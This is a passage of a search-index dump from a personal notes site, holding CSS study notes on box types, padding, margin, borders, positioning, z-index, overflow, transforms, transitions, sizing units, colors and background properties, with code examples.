<code>.gallery img { display: block; }</code></p> </li> </ul> </li> <li> <p>Inline Boxes</p> <ul> <li>Occupies only the space necessary for its content.</li> <li>Causes no line-breaks after or before the element.</li> <li>Box model applies in a different way: heights and widths do not apply.</li> <li>Paddings and margins are applied only horizontally (left and right). That is the padding will be added to all sides expanding the fill area BUT VISUALLY the content area will move right/left only and stay on its place vertically(no new space actually gets created on the page) unlike when we set padding on block-level boxes where the content area moves right/left and up/down also, affecting the content verticall alignment by actually creating a new space on the page.</li> <li>Default elements: <code>::any-pseudo-elements</code>, <code>a</code>, <code>strong</code>, <code>em</code>, etc.</li> <li>CSS style to change from block-level boxes to inline boxes: <code>display: inline;</code></li> </ul> </li> <li> <p>Inline-Block Boxes</p> <ul> <li>Looks like inline from the outside, behaves like block-level on the inside.</li> <li>Occupies only the space necessary for its content.</li> <li>Causes no line-breaks after or before the element.</li> <li>The box-model applies as showed earlier in previous note.</li> <li>Default elements: <code>img</code>, <code>button</code>, etc.</li> <li>CSS style to change from block-level/inline boxes to inline-block boxes: <code>display: inline-block;</code></li> </ul> <p>Good old technic to arrange links in navigation bar</p> <pre><code>nav a:link {\nmargin-right: 30px;\nmargin-top: 10px;\ndisplay: inline-block;\n}\n\nnav a:link:last-child {\nmargin-right: 0;\n}\n</code></pre> <p>Nowadays there is more modern tools achieving this like Flexbox and CSS Grid.</p> </li> </ol> <ul> <li> <p><code>padding</code> - a shorthand for: <code>padding-top</code> <code>padding-right</code> <code>padding-bottom</code> <code>padding-left</code></p> <p>Syntax</p> <pre><code>padding: 5%;                /* All sides: 5% padding */\n\npadding: 10px;              /* All sides: 10px padding */\n\npadding: 10px 20px;         /* top and bottom: 10px padding */\n/* left and right: 20px padding */\n\npadding: 10px 3% 20px;      /* top:            10px padding */\n/* left and right: 3% padding   */\n/* bottom:         20px padding */\n\npadding: 1em 3px 30px 5px;  /* top:    1em padding  */\n/* right:  3px padding  */\n/* bottom: 30px padding */\n/* left:   5px padding  */\n</code></pre> <p>Values</p> <p><code>&lt;length&gt;</code> - The size of the padding as a fixed value. Must be nonnegative.</p> <p><code>&lt;percentage&gt;</code> - The size of the padding as a percentage, relative to the inline size (<code>width</code> in a horizontal language, defined by  writing-mode - property that sets whether lines of text are laid out horizontally or vertically, as well as the direction in which blocks progress) of the containing block(most often it is the content area of an element's nearest block-level ancestor, but this is not always the case(see  Identifying the containing block)). Must be nonnegative.</p> <p>Usage</p> <p>When we need some space inside of an element, mostly for applying a background coloror a border on the element.</p> </li> <li> <p><code>margin</code> - a shorthand for: <code>margin-top</code> <code>margin-right</code> <code>margin-bottom</code> <code>margin-left</code></p> <p>Collapsing Margins of Block-Level elements</p> <p>For Block-Level boxes only: When we have two margins that occupied the same space, the larger one of them is actually visible on the page. Margins aren't collapsed in Inline and Inline-Block boxes.</p> <p>Usage</p> <p>When we need some space outside of an element, or also to create space between multiple elements.</p> <p>In case of adding vertical space between elements across the whole page, we, most of the time, should stick to <code>margin-bottom</code>.</p> </li> <li> <p><code>border: 5px solid #1098ad;</code> - a shorthand for: <code>border-width</code> <code>border-style</code> <code>border-color</code></p> </li> <li> <p><code>border-top/right/bottom/left: 5px solid #1098ad;</code> - same as above, but sets border in specific direction; a shorthand for: <code>border-top/rifht/bottom/left-width</code> <code>border-top/rifht/bottom/left-style</code> <code>border-top/rifht/bottom/left-color</code></p> </li> <li> <p><code>border-collapse: collapse</code> - being set on the parent element transforms neighboring borders of the child elements into one border, e.g.:</p> <pre><code>table {\nborder-collapse: collapse;\n}\n\nth,\ntd {\nborder: 1px solid #343a40;\n}\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Css/#positioning","title":"Positioning","text":"<ul> <li><code>position: relative;</code> - default positioning</li> <li><code>position: absolute;</code> - absolute positioning</li> </ul> <p>Normal Flow vs. Absolute Positioning</p> <ol> <li> <p>Normal Flow</p> <ul> <li>Default positioning of element on the page.</li> <li>Element is \u201cin flow\u201d</li> <li>Elements are simply laid out according to their HTML code.</li> </ul> </li> <li> <p>Absolute Positioning</p> <ul> <li>Element is removed from the normal flow: \u201cout of flow\u201d.</li> <li>No impact on surrounding elements, might overlap them.</li> <li>Use <code>top</code>, <code>bottom</code>, <code>left</code>, or <code>right</code> properties(can have negative values) to offset the element from its relatively positioned container. The default relatively positioned container is the viewport(= visible part of the page after reloading). To position the absolute displayed element(that is set by <code>position: absolute;</code> style) in relation to specific element we need to style that element with <code>position: absolute;</code>.</li> </ul> </li> </ol> <ul> <li> <p><code>z-index:1;</code> - sets the z-order of a positioned(<code>position: relative/absolute/fixed/sticky;</code>) element and its descendants or flex items. Overlapping elements with a larger z-index cover those with a smaller one.</p> <p>Values:</p> <pre><code>/* Keyword value */\n\nz-index: auto;\n\n/*&lt;integer&gt; values*/\nz-index: 0;\nz-index: 3;\nz-index: 289;\nz-index: -1; /*Negative values to lower the priority*/\n\n/*Global values*/\nz-index: inherit;\nz-index: initial;\nz-index: revert;\nz-index: revert-layer;\nz-index: unset;\n</code></pre> <p><code>auto</code> - The box does not establish a new local stacking context. The stack level of the generated box in the current stacking context is <code>0</code>.</p> <p><code>&lt;integer&gt;</code> - Is the stack level of the generated box in the current stacking context. The box also establishes a local stacking context. This means that the z-indexes of descendants are not compared to the z-indexes of elements outside this element.</p> </li> <li> <p><code>overflow: &lt;keyword&gt;;</code> - sets the desired behavior for a parent element's overflow \u2014 i.e. when its child elements' content is too big to fit in its  block formatting context \u2014 in both directions; a shorthand for: <code>overflow-x</code> <code>overflow-y</code></p> <p>Syntax</p> <pre><code>/* Keyword values */\noverflow: visible;\noverflow: hidden;\noverflow: clip;\noverflow: scroll;\noverflow: auto;\noverflow: hidden visible;\n\n/*Global values*/\noverflow: inherit;\noverflow: initial;\noverflow: revert;\noverflow: revert-layer;\noverflow: unset;\n</code></pre> <p>Values</p> <p><code>visible</code> - Content is not clipped and may be rendered outside the padding box.</p> <p><code>hidden</code> - Content is clipped if necessary to fit the padding box. No scrollbars are provided, and no support for allowing the user to scroll (such as by dragging or using a scroll wheel) is allowed. The content can be scrolled programmatically (for example, by setting the value of a property such as  scrollLeft or the  scrollTo() method), so the element is still a scroll container.</p> <p><code>scroll</code> - Content is clipped if necessary to fit the padding box. Browsers always display scrollbars whether or not any content is actually clipped, preventing scrollbars from appearing or disappearing as content changes. Printers may still print overflowing content.</p> <p> Other values</p> <p>Setting the 45 degree rotated badge(child) over the card element(parent).</p> <pre><code>/* parent(card) element */\n.pricing-plan--complete {\nbackground-color: #fdf2e9;\npadding: 4.8rem;\nposition: relative;\noverflow: hidden; /* hides the corners of the rectangle 'after' element */\n}\n\n/* child(badge) element */\n.pricing-plan--complete::after {\ncontent: \"Best value\";\nposition: absolute;\ntop: 6%;\nright: -18%;\n\ntext-transform: uppercase;\nfont-size: 1.4rem;\nfont-weight: 700;\ncolor: #333;\nbackground-color: #ffd43b;\npadding: 0.8rem 8rem;\ntransform: rotate(45deg);\n}\n</code></pre> </li> <li> <p><code>transform: &lt;transform-function&gt;</code> - lets rotate, scale, skew, or translate an element. It modifies the coordinate space of the CSS  visual formatting model.</p> <p>If the property has a value different than <code>none</code>, a  stacking context will be created. In that case, the element will act as a containing block for any <code>position: fixed;</code> or <code>position: absolute;</code> elements that it contains.</p> <p>Only transformable elements can be <code>transform</code>ed.</p> <p>That is, all elements whose layout is governed by the CSS box model except for: non-replaced inline boxes,  table-column boxes, and  table-column-group boxes.</p> <p>Syntax</p> <pre><code>/* Keyword values */\ntransform: none;\n\n/*Function values*/\ntransform: matrix(1, 2, 3, 4, 5, 6);\ntransform: matrix3d(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);\ntransform: perspective(17px);\ntransform: rotate(0.5turn);\ntransform: rotate3d(1, 2, 3, 10deg);\ntransform: rotateX(10deg);\ntransform: rotateY(10deg);\ntransform: rotateZ(10deg);\ntransform: translate(12px, 50%);\ntransform: translate3d(12px, 50%, 3em);\ntransform: translateX(2em);\ntransform: translateY(3in);\ntransform: translateZ(2px);\ntransform: scale(2, 0.5);\ntransform: scale3d(2.5, 1.2, 0.3);\ntransform: scaleX(2);\ntransform: scaleY(0.5);\ntransform: scaleZ(0.3);\ntransform: skew(30deg, 20deg);\ntransform: skewX(30deg);\ntransform: skewY(1.07rad);\n\n/*Multiple function values*/\ntransform: translateX(10px) rotate(10deg) translateY(5px);\ntransform: perspective(500px) translate(10px, 0, 20px) rotateY(3deg);\n\n/*Global values*/\ntransform: inherit;\ntransform: initial;\ntransform: revert;\ntransform: revert-layer;\ntransform: unset;\n</code></pre> <p>The <code>transform</code> property may be specified as either the keyword value <code>none</code> or as one or more <code>&lt;transform-function&gt;</code> values.</p> <p>If <code>perspective()</code> is one of multiple function values, it must be listed first.</p> <p>Values</p> <p><code>none</code> - Specifies that no transform should be applied.</p> <p><code>&lt;transform-function&gt;</code> - One or more of the CSS transform functions to be applied. The transform functions are multiplied in order from left to right, meaning that composite transforms are effectively applied in order from right to left.</p> <p>6 categories of transform functions(click on links below to see all possible functions for each category):</p> <ol> <li> <p> Matrix transformation</p> </li> <li> <p> Perspective</p> </li> <li> <p> Rotation</p> </li> <li> <p> Scaling (resizing)</p> </li> <li> <p> Skewing (distortion)</p> </li> <li> <p> Translation (moving)</p> <ul> <li> <p><code>translate(&lt;length-percentage&gt;, &lt;length-percentage&gt;?)</code> - Translates an element on the 2D plane, i.e. repositions an element in the horizontal and/or vertical directions.</p> <p>Syntax</p> <pre><code>/* Single &lt;length-percentage&gt; values */\ntransform: translate(200px);\ntransform: translate(50%);\n\n/*Double &lt;length-percentage&gt; values*/\ntransform: translate(100px, 200px);\ntransform: translate(100px, 50%);\ntransform: translate(30%, 200px);\ntransform: translate(30%, 50%);\n</code></pre> <p>Values</p> <p>Single <code>&lt;length-percentage&gt;</code> values - a <code>&lt;length&gt;</code> or <code>&lt;percentage&gt;</code> representing the abscissa (horizontal, x-coordinate) of the translating vector. The ordinate (vertical, y-coordinate) of the translating vector will be set to <code>0</code>. A percentage value refers to the width of the reference box defined by the <code>transform-box</code>() property.</p> <p>Double <code>&lt;length-percentage&gt;</code> values - describes two <code>&lt;length&gt;</code> or <code>&lt;percentage&gt;</code> values representing both the abscissa (x-coordinate) and the ordinate (y-coordinate) of the translating vector. A percentage as first value refers to the width, as second part to the height of the reference box defined by the <code>transform-box</code>() property.</p> <p>Place absolute-positioned child element in the middle of its parent element</p> <pre><code>/* parent element */\n.step-img-box {\nposition: relative;\n}\n\n/* absolute-positioned child element */\n.step-img-box::before {\ncontent: \"\";\ndisplay: block;\n\nposition: absolute;\ntop: 50%;\nleft: 50%;\ntransform: translate(-50%, -50%);\n}\n</code></pre> </li> </ul> </li> </ol> </li> <li> <p><code>transition: all 0s ease 0s;</code>(initial values) - enable you to define the transition between two states of an element; a shorthand for: <code>transition-property</code> - sets the CSS properties to which a  transition effect should be applied( see more). <code>transition-duration</code> - sets the length of time a transition animation should take to complete. By default, the value is <code>0s</code>, meaning that no animation will occur( see more). <code>transition-timing-function</code> - sets how intermediate values are calculated for CSS properties being affected by a transition effect( see more). <code>transition-delay</code> - specifies the duration to wait before starting a property's transition effect when its value changes( see more).</p> <p>Transitions enable you to define the transition between two states of an element. Different states may be defined using pseudo-classes like <code>:hover</code> or <code>:active</code> or dynamically set using JavaScript.</p> <p>ALWAYS set <code>transition</code> on the original state of an element</p> <pre><code>/* original state */\n.link:link,\n.link:visited {\ndisplay: inline-block;\ncolor: #e67e22;\ntext-decoration: none;\nborder-bottom: 1px solid currentcolor;\npadding-bottom: 2px;\n\ntransition: all 0.3s;\n}\n\n/* transitioned state */\n.link:hover,\n.link:active {\ncolor: #cf7111;\nborder-bottom: 1px solid transparent;\n}\n</code></pre> <p>Syntax</p> <pre><code>/* Apply to 1 property */\n/*property name | duration*/\ntransition: margin-right 4s;\n\n/*property name | duration | delay*/\ntransition: margin-right 4s 1s;\n\n/*property name | duration | easing function*/\ntransition: margin-right 4s ease-in-out;\n\n/*property name | duration | easing function | delay*/\ntransition: margin-right 4s ease-in-out 1s;\n\n/*Apply to 2 properties*/\ntransition: margin-right 4s, color 1s;\n\n/*Apply to all changed properties*/\ntransition: all 0.5s ease-out;\n\n/*Global values*/\ntransition: inherit;\ntransition: initial;\ntransition: revert;\ntransition: revert-layer;\ntransition: unset;\n</code></pre> <p>The <code>transition</code> property is specified as one or more single-property transitions, separated by commas. Each single-property transition describes the transition that should be applied to a single property (or the special values <code>all</code> and <code>none</code>).</p> <p>Design tips</p> <ul> <li>for average elements set <code>transition-duration</code> to <code>0.3s</code> \u2192 <code>transition: all 0.3s;</code></li> <li>for bigger elements set bigger <code>transition-duration</code></li> </ul> </li> </ul>"},{"location":"Dev/Prg/Langs/Css/#dimensions","title":"Dimensions","text":"<ul> <li> <p><code>width: 100%;</code> - sets the width of the content area, padding area or border area (depending on <code>box-sizing</code>) of certain boxes</p> </li> <li> <p><code>height: 20px;</code> - sets the height of the content area, padding area or border area (depending on <code>box-sizing</code>) of certain boxes</p> </li> <li> <p><code>max-width: 1000px</code> - constrain content width to a certain range:</p> <p>a. if the parent container width is larger than the specified <code>max-width</code>, then the width of the element is equal the value that was specified for <code>max-width</code></p> <p>b. if the parent container width is less than the specified <code>max-width</code>, then the width of the element will be 100% of the parent's container element width</p> </li> <li> <p><code>min-width: 400px;</code> - constrain content width to a certain range</p> </li> <li> <p><code>aspect-ratio: auto/&lt;ratio&gt;;</code> - sets a preferred aspect ratio for the box, which will be used in the calculation of auto sizes and some other layout functions</p> <p>Syntax</p> <pre><code>aspect-ratio: 1 / 1;\n\naspect-ratio: 1;\n\n/*Global values*/\naspect-ratio: inherit;\naspect-ratio: initial;\naspect-ratio: revert;\naspect-ratio: revert-layer;\naspect-ratio: unset;\n</code></pre> <p>Values</p> <p><code>auto</code> -  Replaced elements with an intrinsic aspect ratio use that aspect ratio, otherwise the box has no preferred aspect ratio. Size calculations involving intrinsic aspect ratio always work with the content box dimensions.</p> <p><code>&lt;ratio&gt;</code> - The box's preferred aspect ratio is the specified ratio of <code>width / height</code>. If <code>height</code> and the preceding slash character are omitted, <code>height</code> defaults to <code>1</code>. Size calculations involving preferred aspect ratio work with the dimensions of the box specified by <code>box-sizing</code>.</p> </li> </ul>"},{"location":"Dev/Prg/Langs/Css/#units","title":"units","text":"<p>Relative:</p> <ul> <li> <p><code>%</code> - percentage</p> <p>Calculating percentage values from the containing block</p> <p>When box model properties and offset properties are given a percentage value, the computed value depends on the element's containing block(most often it is the content area of an element's nearest block-level ancestor, but this is not always the case(see  Identifying the containing block):</p> <ol> <li>The <code>height</code>, <code>top</code>, and <code>bottom</code> properties compute percentage values from the <code>height</code> of the containing block.</li> <li>The <code>width</code>, <code>left</code>, <code>right</code>, <code>padding</code>, and <code>margin</code> properties compute percentage values from the <code>width</code> of the containing block.</li> </ol> <p>Square elelment inside the rectangle parent element</p> <p>Setting 3 squared(20px x 20px) elements(<code>div</code>, <code>anchor</code> and <code>::after</code>) insdide rectangle parent element(200px x 100px) using <code>padding-bottm</code> or <code>aspect-ratio</code> trick:</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\" /&gt;\n    &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n    &lt;title&gt;Document&lt;/title&gt;\n    &lt;style&gt;\n.rectangle {\nbackground-color: aqua;\nwidth: 200px;\nheight: 100px;\nmargin: 100px auto;\n}\n\n.square-div {\nbackground-color: blue;\nwidth: 10%; /* 10% of parent's width */\n/*height: 10%; --&gt; will give us only 10px instead of desired 20px */\npadding-bottom: 10%; /* 10% of parent's width; instead, 'aspect-ratio: 1' could also be used here */\n}\n\n.square-anchor:link,\n.square-anchor:visited {\ndisplay: block; /* instead, 'inline-block' could also be used here */\nbackground-color: magenta;\nwidth: 10%;\npadding-bottom: 10%; /* instead, 'aspect-ratio: 1' could also be used here */\n}\n\n.rectangle::after {\ncontent: \"\";\ndisplay: block; /* instead, 'inline-block' could also be used here */\nbackground-color: orange;\nwidth: 10%;\npadding-bottom: 10%; /* instead, 'aspect-ratio: 1' could also be used here */\n}\n&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;div class=\"rectangle\"&gt;\n    &lt;div class=\"square-div\"&gt;&lt;/div&gt;\n    &lt;a href=\"#\" class=\"square-anchor\"&gt;&lt;/a&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Css/#colors-and-images","title":"Colors and Images","text":"<p>Defining colors in CSS</p> <ul> <li> <p>RGB/RGBA Notation</p> <p><code>rgb(0, 255, 255)</code> - regular RGB model <code>rgb(0, 255, 255, 0.3)</code> - RGB with trasparency(alpha)</p> </li> <li> <p>Hexademical notation</p> <p>Instead of using a scale from 0 to 255, we go from 0 to ff(255 in hexademical numbers) <code>#00ffff</code> or <code>#off</code> for shorthand(only when al colors are identical pairs)</p> </li> </ul> <p>In practice we mostly use hexademical colors, and rgba when we need transparency</p> <p>Shades of grey:</p> <p>When colors in all 3 channels(RGB) are the same, we get a grey color. There are 256 pure grays to choose from. There are some that worse to remember: <code>rgb(0, 0, 0)</code> / <code>#000</code> - black <code>rgb(69, 69, 69)</code> / <code>#444</code> - good for test color <code>rgb(183, 183, 183)</code> / <code>#b7b7b7</code> <code>rgb(119, 119, 119)</code> / <code>#777</code> <code>rgb(247, 247, 247)</code> / <code>#f7f7f7</code> <code>rgb(255, 255, 255)</code> / <code>#fff</code> - white</p> <ul> <li> <p><code>color: #1098ad;</code> - defines the color of the element's content text</p> <p><code>currentcolor</code> keyword</p> <p>Represents the value of an element's <code>color</code> property. This lets you use the color value on properties that do not receive it by default.</p> <p>If <code>currentcolor</code> is used as the value of the <code>color</code> property, it instead takes its value from the inherited value of the <code>color</code> property.</p> </li> <li> <p><code>background</code> - sets all background style properties at once; a shorthand for: <code>background-attachment</code> <code>background-clip</code> <code>background-color</code> <code>background-image</code> <code>background-origin</code> <code>background-position</code> <code>background-repeat</code> <code>background-size</code></p> <p>Syntax</p> <pre><code>/* Using a &lt;background-color&gt; */\nbackground: green;\n\n/*Using a &lt;bg-image&gt; and &lt;repeat-style&gt;*/\nbackground: url(\"test.jpg\") repeat-y;\n\n/*Using a &lt;box&gt; and &lt;background-color&gt;*/\nbackground: border-box red;\n\n/*A single image, centered and scaled*/\nbackground: no-repeat center/80% url(\"../img/image.png\");\n\n/*Global values*/\nbackground: inherit;\nbackground: initial;\nbackground: revert;\nbackground: revert-layer;\nbackground: unset;\n</code></pre> <p>The <code>background</code> property is specified as one or more background layers, separated by commas.</p> <p>The syntax of each layer is as follows:</p> <ul> <li> <p>Each layer may include zero or one occurrences of any of the following values:</p> <ul> <li><code>&lt;attachment&gt;</code></li> <li><code>&lt;bg-image&gt;</code></li> <li><code>&lt;position&gt;</code></li> <li><code>&lt;bg-size&gt;</code></li> <li><code>&lt;repeat-style&gt;</code></li> </ul> </li> <li> <p>The <code>&lt;bg-size&gt;</code> value may only be included immediately after<code>&lt;position&gt;</code>, separated with the <code>/</code> character, like this: <code>center/80%</code>.</p> </li> <li> <p>The <code>&lt;box&gt;</code> value may be included zero, one, or two times.     If included once, it sets both <code>background-origin</code>() and <code>background-clip</code>().     If it is included twice, the first occurrence sets <code>background-origin</code>, and the second sets <code>background-clip</code>.</p> </li> <li> <p>The <code>&lt;background-color&gt;</code> value may only be included in the last layer specified.</p> </li> </ul> <p>Values</p> <ul> <li> <p><code>&lt;attachment&gt;</code> - See  <code>background-attachment: scroll;</code>(init value).</p> </li> <li> <p><code>&lt;box&gt;</code> - See  <code>background-clip: border-box;</code>(init value) and  <code>background-origin: padding-box;</code>(init value).</p> </li> <li> <p><code>&lt;background-color&gt;</code> - See <code>background-color: transparent;</code>(init value).</p> <p><code>background-color</code> - sets the background color of an element.</p> <p>Syntax</p> <p>The <code>background-color</code> property is specified as a single <code>&lt;color&gt;</code> value. It is rendered behind any <code>background-image</code> that is specified, although the color will still be visible through any transparency in the image.</p> <pre><code>/* Keyword values */\nbackground-color: red;\nbackground-color: indigo;\n\n/*Hexadecimal value*/\nbackground-color: #bbff00; /*Fully opaque*/\nbackground-color: #bf0; /*Fully opaque shorthand*/\nbackground-color: #11ffee00; /*Fully transparent*/\nbackground-color: #1fe0; /*Fully transparent shorthand*/\nbackground-color: #11ffeeff; /*Fully opaque*/\nbackground-color: #1fef; /*Fully opaque shorthand*/\n\n/*RGB value*/\nbackground-color: rgb(255, 255, 128); /*Fully opaque*/\nbackground-color: rgba(117, 190, 218, 0.5); /*50% transparent*/\n\n/*HSL value*/\nbackground-color: hsl(50, 33%, 25%); /*Fully opaque*/\nbackground-color: hsla(\n50,\n33%,\n25%,\n0.75\n); /*75% opaque, i.e. 25% transparent*/\n\n/*Special keyword values*/\nbackground-color: currentcolor;\nbackground-color: transparent;\n\n/*Global values*/\nbackground-color: inherit;\nbackground-color: initial;\nbackground-color: revert;\nbackground-color: revert-layer;\nbackground-color: unset;\n</code></pre> </li> <li> <p><code>&lt;bg-image&gt;</code> - See  <code>background-image: none;</code>(init value).</p> <p><code>background-image</code> - sets one or more background images on an element.</p> <p>The background images are drawn on stacking context layers on top of each other. The first layer specified is drawn as if it is closest to the user.</p> <p>The <code>border</code>s of the element are then drawn on top of them, and the <code>background-color</code> is drawn beneath them. How the images are drawn relative to the box and its borders is defined by the <code>background-clip</code> and <code>background-origin</code> CSS properties.</p> <p>Syntax</p> <p>Each background image is specified either as the keyword none or as an<code>&lt;image&gt;</code> value. To specify multiple background images, supply multiple values, separated by a comma:</p> <pre><code>background-image: linear-gradient( /* see note below about this function */\nto right bottom,\nrgba(255, 255, 0, 0.5),\nrgba(0, 0, 255, 0.5)\n), url(\"catfront.png\");\n\n/*Global values*/\nbackground-image: inherit;\nbackground-image: initial;\nbackground-image: revert;\nbackground-image: revert-layer;\nbackground-image: unset;\n</code></pre> <p>Values</p> <p><code>none</code> - Is a keyword denoting the absence of images.</p> <p><code>&lt;image&gt;</code> - Is an <code>&lt;image&gt;</code> denoting the image to display. There can be several of them, separated by commas, as  multiple backgrounds are supported.</p> <p>Image-related functions()</p> <ul> <li><code>cross-fade()</code></li> <li><code>element()</code></li> <li><code>image()</code></li> <li><code>image-set()</code></li> <li><code>paint()</code></li> <li><code>url()</code></li> </ul> <p>Gradient:</p> <p>Using CSS gradients()</p> <ul> <li> <p><code>linear-gradient()</code> - creates an image consisting of a progressive transition between two or more colors along a straight line. Its result is an object of the <code>&lt;gradient&gt;</code> data type, which is a special kind of <code>&lt;image&gt;</code>. See more at </p> <p>Syntax</p> <pre><code>/* A gradient tilted 45 degrees,\nstarting blue and finishing red */\nlinear-gradient(45deg, blue, red);\n\n/* A gradient going from the bottom right to the top left corner,\nstarting blue and finishing red */\nlinear-gradient(to left top, blue, red);\n\n/* Color stop: A gradient going from the bottom to top,\nstarting blue, turning green at 40% of its length,\nand finishing red */\nlinear-gradient(0deg, blue, green 40%, red);\n\n/* Color hint: A gradient going from the left to right,\nstarting red, getting to the midpoint color\n10% of the way across the length of the gradient,\ntaking the rest of the 90% of the length to change to blue */\nlinear-gradient(.25turn, red, 10%, blue);\n\n/* Multi-position color stop: A gradient tilted 45 degrees,\nwith a red bottom-left half and a blue top-right half,\nwith a hard line where the gradient changes from red to blue */\nlinear-gradient(45deg, red 0 50%, blue 50% 100%);\n</code></pre> <p>Values</p> <p><code>&lt;side-or-corner&gt;</code> - The position of the gradient line's starting point. If specified, it consists of the word <code>to</code> and up to two keywords: one indicates the horizontal side (<code>left</code> or <code>right</code>), and the other the vertical side (<code>top</code> or <code>bottom</code>). The order of the side keywords does not matter. If unspecified, it defaults to <code>to bottom</code>.</p> <p>The values<code>to top</code>, <code>to bottom</code>, <code>to left</code>, and <code>to right</code> are equivalent to the angles <code>0deg</code>, <code>180deg</code>, <code>270deg</code>, and <code>90deg</code>, respectively. The other values are translated into an angle.</p> <p><code>&lt;angle&gt;</code> - The gradient line's angle of direction. A value of <code>0deg</code> is equivalent to <code>to top</code>; increasing values rotate clockwise from there.</p> <p><code>&lt;linear-color-stop&gt;</code> - A color-stop's <code>&lt;color&gt;</code> value, followed by one or two optional stop positions, (each being either a <code>&lt;percentage&gt;</code> or a <code>&lt;length&gt;</code> along the gradient's axis).</p> <p><code>&lt;color-hint&gt;</code> - An interpolation hint defining how the gradient progresses between adjacent color stops. The length defines at which point between two color stops the gradient color should reach the midpoint of the color transition. If omitted, the midpoint of the color transition is the midpoint between two color stops.</p> </li> <li> <p><code>radial-gradient()</code></p> </li> <li><code>conic-gradient()</code></li> <li><code>repeating-linear-gradient()</code></li> <li><code>repeating-radial-gradient()</code></li> <li><code>repeating-conic-gradient()</code></li> </ul> </li> <li> <p><code>&lt;position&gt;</code> - See  <code>background-position: 0% 0%;</code>(init value).</p> <p><code>background-position</code> - sets the initial position for each background image. The position is relative to the position layer set by <code>background-origin</code>.</p> <p>Syntax</p> <pre><code>/* Keyword values */\nbackground-position: top;\nbackground-position: bottom;\nbackground-position: left;\nbackground-position: right;\nbackground-position: center;\n\n/*&lt;percentage&gt; values*/\nbackground-position: 25% 75%;\n\n/*&lt;length&gt; values*/\nbackground-position: 0 0;\nbackground-position: 1cm 2cm;\nbackground-position: 10ch 8em;\n\n/*Multiple images*/\nbackground-position: 0 0, center;\n\n/*Edge offsets values*/\nbackground-position: bottom 10px right 20px;\nbackground-position: right 3em bottom 10px;\nbackground-position: bottom 10px right;\nbackground-position: top right 10px;\n\n/*Global values*/\nbackground-position: inherit;\nbackground-position: initial;\nbackground-position: revert;\nbackground-position: revert-layer;\nbackground-position: unset;\n</code></pre> <p>Value - </p> <p><code>center</code> - is the frquently used value, which centers the image.</p> </li> <li> <p><code>&lt;repeat-style&gt;</code> - See  <code>background-repeat: repeat;</code>(init value).</p> </li> <li> <p><code>&lt;bg-size&gt;</code> - See  <code>background-size: auto auto;</code>(init value).</p> <p><code>background-size</code> - sets the size of the element's background image. The image can be left to its natural size, stretched, or constrained to fit the available space.</p> <p>Syntax</p> <pre><code>/* Keyword values */\nbackground-size: cover;\nbackground-size: contain;\n\n/*One-value syntax*/\n/*the width of the image (height becomes 'auto')*/\nbackground-size: 50%;\nbackground-size: 3.2em;\nbackground-size: 12px;\nbackground-size: auto;\n\n/*Two-value syntax*/\n/*first value: width of the image, second value: height*/\nbackground-size: 50% auto;\nbackground-size: 3em 25%;\nbackground-size: auto 6px;\nbackground-size: auto auto;\n\n/*Multiple backgrounds*/\nbackground-size: auto, auto; /*Not to be confused with `auto auto`*/\nbackground-size: 50%, 25%, 25%;\nbackground-size: 6px, auto, contain;\n\n/*Global values*/\nbackground-size: inherit;\nbackground-size: initial;\nbackground-size: revert;\nbackground-size: revert-layer;\nbackground-size: unset;\n</code></pre> <p>The <code>background-size</code> property is specified in one of the following ways:</p> <ul> <li>Using the keyword values <code>contain</code> or <code>cover</code>.</li> <li>Using a width value only, in which case the height defaults to <code>auto</code>.</li> <li>Using both a width and a height value, in which case the first sets the width and the second sets the height. Each value can be a <code>&lt;length&gt;</code>, a <code>&lt;percentage&gt;</code>, or <code>auto</code>.</li> </ul> <p>To specify the size of multiple background images, separate the value for each one with a comma.</p> <p>Values</p> <p><code>contain</code> - Scales the image as large as possible within its container without cropping or stretching the image. If the container is larger than the image, this will result in image tiling, unless the <code>background-repeat</code> property is set to<code>no-repeat</code>.</p> <p><code>cover</code> - Scales the image (while preserving its ratio) to the smallest possible size to fill the container (that is: both its height and width completely cover the container), leaving no empty space. If the proportions of the background differ from the element, the image is cropped either vertically or horizontally.</p> <p><code>auto</code> - Scales the background image in the corresponding direction such that its  intrinsic proportions are maintained.</p> <p><code>&lt;length&gt;</code> - Stretches the image in the corresponding dimension to the specified length. Negative values are not allowed.</p> <p><code>&lt;percentage&gt;</code> - Stretches the image in the corresponding dimension to the specified percentage of the background positioning area. The background positioning area is determined by the value of <code>background-origin</code> (by default, the padding box). However, if the background's <code>background-attachment</code> value is <code>fixed</code>, the positioning area is instead the entire viewport. Negative values are not allowed.</p> </li> </ul> </li> <li> <p><code>background-color: #444;</code> - set the backgroud color of an element(<code>#444</code> is a shorthand of <code>#444444</code>)</p> </li> <li> <p><code>stroke: #087f5b;</code> - paints along(\u0440\u0438\u0441\u0443\u0435\u0442 \u043f\u043e \u043a\u043e\u043d\u0442\u0443\u0440\u0442\u0443) the outline of the given graphical element: used to set color for outline icons</p> </li> <li> <p><code>fill: #087f5b;</code> - paints the interior(\u0440\u0438\u0441\u0443\u0435\u0442 \u0432\u043d\u0443\u0442\u0440\u0435\u043d\u043d\u044e\u044e \u0447\u0430\u0441\u0442\u044c) of the given graphical element: used to set color for fill icons</p> </li> <li> <p><code>box-shadow: [inset] &lt;offset-x&gt; &lt;offset-y&gt; &lt;blur-radius&gt; &lt;spread-radius&gt; [&lt;color&gt;];</code> - adds shadow effects around an element's frame. You can set multiple effects separated by commas. To specify multiple shadows, provide a comma-separated list of shadows.</p> <p>Syntax</p> <pre><code>/* Keyword values */\n\nbox-shadow: none;\n\n/*offset-x | offset-y | color*/\nbox-shadow: 60px -16px teal;\n\n/*offset-x | offset-y | blur-radius | color*/\nbox-shadow: 10px 5px 5px black;\n\n/*offset-x | offset-y | blur-radius | spread-radius | color*/\nbox-shadow: 2px 2px 2px 1px rgba(0, 0, 0, 0.2);\n\n/*inset | offset-x | offset-y | color*/\nbox-shadow: inset 5em 1em gold;\n\n/*Any number of shadows, separated by commas*/\nbox-shadow: 3px 3px red, -1em 0 